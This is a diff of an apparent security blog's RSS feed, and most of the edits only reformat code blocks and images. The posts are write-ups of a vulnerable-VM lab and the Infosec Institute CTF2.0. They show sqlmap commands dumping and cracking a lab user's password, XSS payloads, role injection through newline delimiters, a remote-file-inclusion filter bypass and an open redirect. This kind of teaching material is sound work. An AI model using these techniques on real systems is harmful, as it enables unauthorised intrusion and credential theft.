@@ -338,31 +338,33 @@ root&amp;#64;kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?us
 &lt;span class="o"&gt;[&lt;/span&gt;11:13:26&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; GET parameter &lt;span class="s1"&gt;'usrtosearch'&lt;/span&gt; is &lt;span class="s1"&gt;'MySQL UNION query (NULL) - 1 to 20 columns'&lt;/span&gt; injectable
 &lt;/pre&gt;
 &lt;p&gt;Result! Using this we can now dump the databasenames, tables, and data in the DB&lt;/p&gt;
-&lt;p&gt;(output shortened for clarity)
-.. code:: bash&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;&lt;a class="reference external" href="mailto:root&amp;#64;kali"&gt;root&amp;#64;kali&lt;/a&gt;:~# sqlmap -u &lt;a class="reference external" href="http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch=ramses"&gt;http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch=ramses&lt;/a&gt; --current-db
+&lt;p&gt;(output shortened for clarity)&lt;/p&gt;
+&lt;pre class="code bash literal-block"&gt;
+root&amp;#64;kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch&lt;span class="o"&gt;=&lt;/span&gt;ramses --current-db
 back-end DBMS: MySQL 5.0.12
-[11:13:44] [INFO] fetching current database
-current database:    'seth'&lt;/p&gt;
-&lt;p&gt;&lt;a class="reference external" href="mailto:root&amp;#64;kali"&gt;root&amp;#64;kali&lt;/a&gt;:~# sqlmap -u &lt;a class="reference external" href="http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch=ramses"&gt;http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch=ramses&lt;/a&gt; --tables -D seth
-[11:13:55] [INFO] fetching tables for database: 'seth'
+&lt;span class="o"&gt;[&lt;/span&gt;11:13:44&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; fetching current database
+current database:    &lt;span class="s1"&gt;'seth'&lt;/span&gt;
+
+root&amp;#64;kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch&lt;span class="o"&gt;=&lt;/span&gt;ramses --tables -D seth
+&lt;span class="o"&gt;[&lt;/span&gt;11:13:55&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; fetching tables &lt;span class="k"&gt;for&lt;/span&gt; database: &lt;span class="s1"&gt;'seth'&lt;/span&gt;
 Database: seth
-[1 table]
+&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; table&lt;span class="o"&gt;]&lt;/span&gt;
 +-------+
-| users |
-+-------+&lt;/p&gt;
-&lt;p&gt;&lt;a class="reference external" href="mailto:root&amp;#64;kali"&gt;root&amp;#64;kali&lt;/a&gt;:~# sqlmap -u &lt;a class="reference external" href="http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch=ramses"&gt;http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch=ramses&lt;/a&gt; --dump -D seth -T users
+&lt;span class="p"&gt;|&lt;/span&gt; users &lt;span class="p"&gt;|&lt;/span&gt;
++-------+
+
+
+root&amp;#64;kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch&lt;span class="o"&gt;=&lt;/span&gt;ramses --dump -D seth -T users
 Database: seth
 Table: users
-[2 entries]
+&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt; entries&lt;span class="o"&gt;]&lt;/span&gt;
 +----+---------------------------------------------+--------+------------+
-| id | pass                                        | user   | position   |
+&lt;span class="p"&gt;|&lt;/span&gt; id &lt;span class="p"&gt;|&lt;/span&gt; pass                                        &lt;span class="p"&gt;|&lt;/span&gt; user   &lt;span class="p"&gt;|&lt;/span&gt; position   &lt;span class="p"&gt;|&lt;/span&gt;
 +----+---------------------------------------------+--------+------------+
-| 1  | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | &amp;lt;blank&amp;gt;    |
-| 2  | --not allowed--                             | isis   | employee   |
-+----+---------------------------------------------+--------+------------+&lt;/p&gt;
-&lt;/blockquote&gt;
+&lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;  &lt;span class="p"&gt;|&lt;/span&gt; YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE &lt;span class="p"&gt;|&lt;/span&gt; ramses &lt;span class="p"&gt;|&lt;/span&gt; &amp;lt;blank&amp;gt;    &lt;span class="p"&gt;|&lt;/span&gt;
+&lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;  &lt;span class="p"&gt;|&lt;/span&gt; --not allowed--                             &lt;span class="p"&gt;|&lt;/span&gt; isis   &lt;span class="p"&gt;|&lt;/span&gt; employee   &lt;span class="p"&gt;|&lt;/span&gt;
++----+---------------------------------------------+--------+------------+
+&lt;/pre&gt;
 &lt;p&gt;An MD5 hashed password? I best put that through &lt;a class="reference external" href="http://md5decoder.org/"&gt;md5decoder&lt;/a&gt; to
 be rewarded with the password &lt;code&gt;omega&lt;/code&gt;&lt;/p&gt;
 &lt;/div&gt;
@@ -424,7 +426,7 @@ what it managed to collect. So far it's mostly conficker variants, but there's a
 suprising (to me) large number of infected machines out there. In one 8 hour period
 during testing, it managed to collect 8 unique samples from 154 connections.&lt;/p&gt;
 &lt;p&gt;Here's the stats from that period:&lt;/p&gt;
-&lt;img alt="" src="&amp;quot;http://i.imgur.com/j828Fpw.png&amp;quot;" /&gt;
+&lt;a class="reference external image-reference" href="http://i.imgur.com/j828Fpw.png"&gt;&lt;img alt="" src="http://i.imgur.com/j828Fpw.png" style="width: 500px;" /&gt;&lt;/a&gt;
 &lt;p&gt;It should be fairly interesting to see if anything else comes along during its
 uptime.&lt;/p&gt;
 </description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Sven Steinbauer</dc:creator><pubDate>Thu, 16 Jul 2015 12:00:00 +0100</pubDate><guid>tag:,2015-07-16:2015/07/16/honeypotting-with-dionaea-and-raspi/</guid></item><item><title>Infosec Institute CTF2.0</title><link>/2015/06/25/infosec-institute-ctf20/</link><description>&lt;p&gt;The folks over at the &lt;a class="reference external" href="https://infosecinstitute.com"&gt;Infosec Institue&lt;/a&gt; have released
@@ -434,7 +436,7 @@ their &lt;a class="reference external" href="http://ctf.infosecinstitute.com/ctf
 &lt;p&gt;In &lt;a class="reference external" href="http://ctf.infosecinstitute.com/ctf2/exercises/ex1.php"&gt;level 01&lt;/a&gt; I am supposed
 to use the provided form to perform a cross site scripting exploit. Here's what the form
 looks like:&lt;/p&gt;
-&lt;img alt="" src="http://i.imgur.com/CJTNyK4.png" /&gt;
+&lt;img alt="" src="http://i.imgur.com/CJTNyK4.png" style="width: 500px;" /&gt;
 &lt;p&gt;At first I might as well test how the form works. Entering something like &lt;code&gt;test&lt;/code&gt; and
 &lt;code&gt;www.test.com&lt;/code&gt; in the fields simply adds the supplied information to the column on the left.
 So I try the usual XSS payload: &lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;quot;Ex1&amp;quot;);&amp;lt;/script&amp;gt;&lt;/code&gt; in the &lt;code&gt;Site Name&lt;/code&gt; field.&lt;/p&gt;
@@ -447,7 +449,7 @@ delete this or just change it to &lt;code&gt;.+&lt;/code&gt; so it matches any c
 &lt;img alt="" src="http://i.imgur.com/yvSc4To.png" /&gt;
 &lt;p&gt;However, there's no pop up. So there must be something else validating input. Heading back to the
 source I find some javscript in &lt;code&gt;ex1.js&lt;/code&gt; which contains the following code:&lt;/p&gt;
-&lt;a class="reference external image-reference" href="http://i.imgur.com/VVe74tW.png"&gt;&lt;img alt="" src="http://i.imgur.com/VVe74tW.png" /&gt;&lt;/a&gt;
+&lt;a class="reference external image-reference" href="http://i.imgur.com/VVe74tW.png"&gt;&lt;img alt="" src="http://i.imgur.com/VVe74tW.png" style="width: 500px;" /&gt;&lt;/a&gt;
 &lt;p&gt;The &lt;code&gt;siteName&lt;/code&gt; variable has all &lt;code&gt;&amp;lt;&lt;/code&gt; and &lt;code&gt;&amp;gt;&lt;/code&gt; characters replaced with their equivalent html codes.
 By clicking on the gutter in the source code I set a breakpoint on the line that does this, and resubmit
 my data. The Firebug debugger breaks on the line and I step over it. Sure enough &lt;code&gt;siteName&lt;/code&gt; is not
@@ -480,7 +482,7 @@ valid. With Firebug I can edit the value of the operand to the following:&lt;/p&
 &lt;p&gt;&lt;a class="reference external" href="http://ctf.infosecinstitute.com/ctf2/exercises/ex3.php"&gt;Level 03&lt;/a&gt; provides me with a registration
 form and a login form. The instructions indicate that the data is stored in a delimited file and I need
 to sign up as a new user with admin rights.&lt;/p&gt;
-&lt;img alt="" src="http://i.imgur.com/f0g5TmV.png" /&gt;
+&lt;img alt="" src="http://i.imgur.com/f0g5TmV.png" style="width: 500px;" /&gt;
 &lt;p&gt;First things first, let's see if we can figure out the delimiter... Signing up and logging in
 shows us our name and current role: &lt;code&gt;role:normal&lt;/code&gt;. This already tells me that the delimiter is not
 &lt;code&gt;:&lt;/code&gt;. After fuzzing the input it turns out most characters are ok to use. So what's the delimeter?
@@ -488,7 +490,7 @@ I check the hints and it tells me that it's the newline character. Interesting, 
 but had no luck. Unless..&lt;/p&gt;
 &lt;p&gt;So let's not use &lt;code&gt;\n&lt;/code&gt; but a real new line. I can achieve this by editing the source with Firebug
 once again, changing the &lt;code&gt;lastname&lt;/code&gt; field to a &lt;code&gt;textarea&lt;/code&gt; type:&lt;/p&gt;
-&lt;p&gt;&lt;a class="reference external" href="http://i.imgur.com/QBVptMv.png"&gt;{{&amp;lt; figure src=&amp;quot;http://i.imgur.com/QBVptMv.png&amp;quot; &amp;gt;}}&lt;/a&gt;&lt;/p&gt;
+&lt;a class="reference external image-reference" href="http://i.imgur.com/QBVptMv.png"&gt;&lt;img alt="" src="http://i.imgur.com/QBVptMv.png" style="width: 500px;" /&gt;&lt;/a&gt;
 &lt;p&gt;Now I can have multiple lines and enter a real carriage return into the field. My last
 name will be&lt;/p&gt;
 &lt;pre class="code console literal-block"&gt;
@@ -501,7 +503,7 @@ role:admin&lt;/span&gt;
 &lt;div class="section" id="level-04"&gt;
 &lt;h2&gt;Level 04&lt;/h2&gt;
 &lt;p&gt;&lt;a class="reference external" href="http://ctf.infosecinstitute.com/ctf2/exercises/ex4.php"&gt;Level 04&lt;/a&gt;&lt;/p&gt;
-&lt;a class="reference external image-reference" href="http://i.imgur.com/nmRe8U2.png"&gt;&lt;img alt="" src="http://i.imgur.com/nmRe8U2.png" /&gt;&lt;/a&gt;
+&lt;a class="reference external image-reference" href="http://i.imgur.com/nmRe8U2.png"&gt;&lt;img alt="" src="http://i.imgur.com/nmRe8U2.png" style="width: 500px;" /&gt;&lt;/a&gt;
 &lt;p&gt;Here we need to load a php file instead of the text files that load when you click
 on the &lt;em&gt;Bio&lt;/em&gt;, &lt;em&gt;Clients&lt;/em&gt;, or &lt;em&gt;About&lt;/em&gt; buttons. The instructions are very clear,
 but it sounds like we need to load a phop file from the root of the domain. Let's
@@ -521,7 +523,7 @@ the argument to get a new error: &lt;em&gt;You are trying to add a remote URL.&l
 As one of the hints is that the regex might be case sensitive, let's capitalise the &lt;code&gt;h&lt;/code&gt; in &lt;code&gt;http&lt;/code&gt;.
 This time we get an &lt;em&gt;invalid file&lt;/em&gt; message, so that bypass worked. Now we need to satisfy the
 &lt;code&gt;file3.txt&lt;/code&gt; requirement and using &lt;code&gt;Http://infosecinstitute.com/file3.txt.php&lt;/code&gt; I get the flag&lt;/p&gt;
-&lt;a class="reference external image-reference" href="http://i.imgur.com/WTFYtJi.png"&gt;&lt;img alt="" src="http://i.imgur.com/WTFYtJi.png" /&gt;&lt;/a&gt;
+&lt;a class="reference external image-reference" href="http://i.imgur.com/WTFYtJi.png"&gt;&lt;img alt="" src="http://i.imgur.com/WTFYtJi.png" style="width: 500px;" /&gt;&lt;/a&gt;
 &lt;/div&gt;
 &lt;div class="section" id="level-05"&gt;
 &lt;h2&gt;Level 05&lt;/h2&gt;
@@ -557,7 +559,7 @@ without the need for user interaction. Ok, fine, let's revisit the allowed tags.
 &lt;h2&gt;Level 07&lt;/h2&gt;
 &lt;p&gt;&lt;a class="reference external" href="http://ctf.infosecinstitute.com/ctf2/exercises/ex7.php"&gt;Level 07&lt;/a&gt; is a login form on which
 we need to perform another XSS attack.&lt;/p&gt;
-&lt;img alt="" src="http://i.imgur.com/WO8dRpe.png" /&gt;
+&lt;img alt="" src="http://i.imgur.com/WO8dRpe.png" style="width: 500px;" /&gt;
 &lt;p&gt;Well, lucky for me I perform these challenges through a proxy which unhides hidden fields like
 the one you see there. Some investigation shows that the value of the hidden field comes from
 a php_self value. That is it uses whatever the URL part is to populate the field, so that form
@@ -625,7 +627,7 @@ use echo with the &lt;code&gt;-n&lt;/code&gt; flag:&lt;/p&gt;
 &lt;h2&gt;Level 10&lt;/h2&gt;
 &lt;p&gt;&lt;a class="reference external" href="http://ctf.infosecinstitute.com/ctf2/exercises/ex10.php"&gt;Level 10&lt;/a&gt; is a game and we need to
 edit its source so we look like we're really good at it.&lt;/p&gt;
-&lt;img alt="" src="http://i.imgur.com/g03njlQ.png" /&gt;
+&lt;img alt="" src="http://i.imgur.com/g03njlQ.png" style="width: 500px;" /&gt;
 &lt;p&gt;Entering anything in the name I field I have a poke around to see how the whole thing
 works. We're shown some coloured squares and then they are turn over. We need to then
 remember which colour each square had. Except we need to do it at least 9999 times and
@@ -673,7 +675,7 @@ it looks like they are visiting &lt;code&gt;ctf.infosecinstitute.com&lt;/code&gt
 &lt;p&gt;Well the obvious thing is just to try and type in another URL &lt;code&gt;http://ctf.infosecinstitute.com/ctf2/exercises/ex13.php?redirect=http://unlogic.co.uk&lt;/code&gt;
 but that gives me an error. Hrmm... trying a few other redirect options tells me that the redirect is URL
 relative, which means if I strip off the protocol off the URL, I should be able to make this work:&lt;/p&gt;
-&lt;a class="reference external image-reference" href="http://i.imgur.com/QM7V8Dk.png"&gt;&lt;img alt="" src="http://i.imgur.com/QM7V8Dk.png" /&gt;&lt;/a&gt;
+&lt;a class="reference external image-reference" href="http://i.imgur.com/QM7V8Dk.png"&gt;&lt;img alt="" src="http://i.imgur.com/QM7V8Dk.png" style="width: 500px;" /&gt;&lt;/a&gt;
 &lt;p&gt;Sure enough, that worked. That's it, the final flag.&lt;/p&gt;
 &lt;p&gt;Thanks to the Infosec Institute for another great CTF!&lt;/p&gt;
 &lt;/div&gt;
